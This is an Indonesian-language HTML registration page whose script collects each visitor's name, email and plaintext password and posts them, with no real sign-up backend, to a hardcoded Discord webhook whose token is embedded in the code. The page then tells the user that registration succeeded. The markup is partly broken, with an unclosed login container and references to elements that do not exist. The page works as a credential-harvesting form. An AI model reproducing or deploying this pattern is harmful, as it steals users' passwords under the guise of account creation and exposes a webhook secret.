<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Form Pendaftaran dan Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 20px;
    }
    h2 {
      text-align: center;
      color: #333;
    }
    .form-container {
      background: #fff;
      padding: 20px;
      border-radius: 5px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      margin: 20px auto;
    }
    label {
      display: block;
      margin-bottom: 5px;
      color: #555;
    }
    input[type="text"],
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background-color: #218838;
    }
    .message {
      text-align: center;
      margin-top: 20px;
      color: #d9534f; /* Red color for error messages */
    }
    .success {
      color: #5cb85c; /* Green color for success messages */
    }
  </style>
</head>
<body>
  <h2>Form Pendaftaran</h2>

  <div class="form-container" id="registerContainer">
    <h2>Pendaftaran</h2>
    <form id="daftarForm">
      <label for="firstName">Nama Depan:</label>
      <input type="text" id="firstName" name="firstName" required>
      
      <label for="lastName">Nama Belakang:</label>
      <input type="text" id="lastName" name="lastName" required>
      
      <label for="email">Email:</label>
      <input type="email" id="email" name="email" required>
      
      <label for="password">Password:</label>
      <input type="password" id="password" name="password" required>
      
      <button type="submit">Daftar</button>
    </form>
    <div id="registerMessage" class="message"></div>
  </div>
  <div class="form-container" id="loginContainer">halo semua silahkan daftar :)
    
  <script>
    const registerForm = document.getElementById("daftarForm");
    const loginForm = document.getElementById("loginForm");
    const registerMessageDiv = document.getElementById("registerMessage");
    const loginMessageDiv = document.getElementById("loginMessage");

    // Handle registration
    registerForm.addEventListener("submit", (e) => {
      e.preventDefault(); // Prevent page refresh

      const firstName = document.getElementById("firstName").value;
      const lastName = document.getElementById("lastName").value;
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      const webhookURL = "https://discord.com/api/webhooks/1331267993916805200/ldxIhL7EUuwqEOq15y2MVIq-JYrjB4yqVFbkYs2U-ymLej4SmJfmz4Wbp_Bzm0B38QyX"; // Ganti ini

      const data = {
        content: `**New User Registered!**\n**First Name:** ${firstName}\n**Last Name:** ${lastName}\n**Email:** ${email}\
        \n**Password:** ${password}`, // Pesan ke Discord
              };
        
              fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
              })
        .then((response) => {
          if (response.ok) {
            registerMessageDiv.innerHTML = "<p class='success'>Pendaftaran berhasil! Silakan login.</p>";
            registerForm.reset();
          } else {
            registerMessageDiv.innerHTML = "<p class='message'>Gagal mengirim data.</p>";
          }
        })
        .catch((error) => {
          console.error("Error:", error);
          registerMessageDiv.innerHTML = "<p class='message'>Terjadi kesalahan. Silakan coba lagi.</p>";
        });
            });
          </script>
        </body>
        </html>
